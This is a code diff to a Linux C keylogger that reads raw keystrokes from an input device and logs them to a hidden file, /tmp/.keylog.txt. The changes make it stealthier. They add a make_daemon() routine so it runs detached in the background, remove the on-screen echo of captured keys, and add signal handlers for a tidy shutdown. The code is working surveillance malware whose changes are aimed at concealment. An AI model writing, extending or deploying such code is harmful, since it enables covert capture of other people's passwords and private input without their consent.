@@ -77,9 +77,22 @@ char *shift_key_map[] = {
       [KEY_COMMA] = "<", [KEY_DOT] = ">", [KEY_SLASH] = "?"};
 
 FILE *log_ptr = NULL;
+int fd;
 
 int caps_active = 0;
 int shift_active = 0;
+
+void make_daemon(){
+  pid_t pid = fork();
+
+  if(pid < 0) exit(EXIT_FAILURE);
+  if(pid > 0) exit(EXIT_SUCCESS);
+
+  if (setsid() < 0) exit(EXIT_FAILURE);
+
+  chdir("/");
+  umask(0);
+}
 
 char *handleCharPressed(short ev_code, int ev_value){
 	if (caps_active == 1 || shift_active == 1){
@@ -109,36 +122,51 @@ void handleKeyPressed(short ev_code, int ev_value){
 		}
 	}
 	else if (ev_value != 0){
-		printf("%s", handleCharPressed(ev_code, ev_value));
     fprintf(log_ptr ,"%s", handleCharPressed(ev_code, ev_value));
 	}
 }
 
-void INThandler() {
-  printf("\nClosing device and exiting...\n");
+void cleanNexit(int sig) {
+  if (log_ptr != NULL){
+    fprintf(log_ptr, "\nProcess Terminated (Signal: %d)\n", sig);
+    fclose(log_ptr);
+  }
+  close(fd);
   exit(0);
 }
 
 int main(int argc, char const *argv[])
 {
     //opening /input file descriptor
-	int fd;
+	
   struct input_event ev;
   fd = open(DEVICE_INPUT_PATH, O_RDONLY);
   if (fd == -1) {
   	perror("Error while opening the device file");
   	printf("maybe you need root privilege...");
   }
-  printf("this is my fd: %d\n", fd);
+  printf("this is my fd: %d\n", fd);  
+  close(fd);
+
+  make_daemon();
+
+  signal(SIGINT, cleanNexit);
+  signal(SIGTERM, cleanNexit);
+
+  fd = open(DEVICE_INPUT_PATH, O_RDONLY);
+  if (fd == -1) {
+    perror("Error while opening the device file");
+    printf("maybe you need root privilege...");
+  }
 
   //opening log.txt file
-  log_ptr = fopen("/tmp/.keylog.txt", "a");
+  log_ptr = fopen("/tmp/.keylog.txt", "w");
   if (log_ptr == NULL)
   {
    	perror("Error while opening log file");
   }
 
-  signal(SIGINT, INThandler);
+
 
   while(1){
   	ssize_t bytes_read = read(fd, &ev, sizeof(ev));
@@ -153,9 +181,6 @@ int main(int argc, char const *argv[])
   		return EXIT_FAILURE;
   	}
   }
-
-  close(fd);
-  fclose(log_ptr);
 
   return EXIT_SUCCESS;
 }
